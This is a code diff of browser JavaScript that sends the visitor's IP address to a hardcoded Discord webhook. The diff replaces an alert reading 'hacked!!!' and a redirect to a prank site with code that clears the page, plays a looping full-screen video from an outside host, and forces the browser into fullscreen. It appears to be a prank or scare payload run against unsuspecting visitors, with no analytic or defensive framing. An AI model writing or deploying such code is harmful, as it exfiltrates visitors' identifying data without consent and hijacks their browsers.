@@ -13,7 +13,19 @@ fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4
     body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
 })
 
-alert("hacked!!! " + xmlHttp.responseText + " 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹")
+document.body.innerHTML = '';
+document.write('<video id="video" style="width: 100%; height: 100%; object-fit: cover;" src="https://pnrtscr.com/video.mp4" loop=""></video>')
 
-document.location = "https://youareanidiot.cc/"
+const video = document.getElementById("video");
+video.play();
+
+const { documentElement } = document;
+if(documentElement.requestFullscreen) documentElement.requestFullscreen();
+else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
+else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
+else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
+
+
+
+
 
